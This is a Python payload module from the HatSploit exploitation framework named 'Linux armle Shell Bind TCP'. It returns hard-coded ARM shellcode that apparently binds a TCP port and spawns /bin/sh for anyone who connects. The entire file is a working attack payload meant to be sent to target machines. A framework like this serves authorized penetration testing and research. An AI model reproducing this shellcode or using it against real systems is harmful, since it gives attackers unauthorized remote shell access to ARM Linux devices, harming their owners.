"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.socket import Socket


class HatSploitPayload(Payload, Socket):
    details = {
        "Name": "Linux armle Shell Bind TCP",
        "Payload": "linux/armle/shell_bind_tcp",
        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
        "Description": "Shell bind TCP payload for Linux armle.",
        "Architecture": "armle",
        "Platform": "linux",
        "Rank": "high",
        "Type": "bind_tcp",
    }

    def run(self):
        bind_port = self.pack_port(self.handler["BPORT"])

        return (
            b"\x01\xe0\x8f\xe2"
            b"\x1e\xff\x2f\xe1"
            b"\x02\x20\x01\x21"
            b"\x52\x40\xc8\x27"
            b"\x51\x37\x01\xdf"
            b"\x03\x1c\x0d\xa1"
            b"\x4a\x70\x4a\x60"
            b"\x10\x22\x01\x37"
            b"\x01\xdf\x18\x1c"
            b"\x02\x21\x02\x37"
            b"\x01\xdf\x18\x1c"
            b"\x49\x40\x52\x40"
            b"\x01\x37\x01\xdf"
            b"\x03\x1c\x03\x21"
            b"\x3f\x27\x18\x1c"
            b"\x01\x39\x01\xdf"
            b"\x91\x42\xfa\xd1"
            b"\x03\xa0\xc1\x71"
            b"\x0b\x27\x01\xdf"
            b"\x02\xff" + bind_port + b"\x01\x01\x01\x01"
            b"\x2f\x62\x69\x6e"
            b"\x2f\x73\x68\x58"
        )
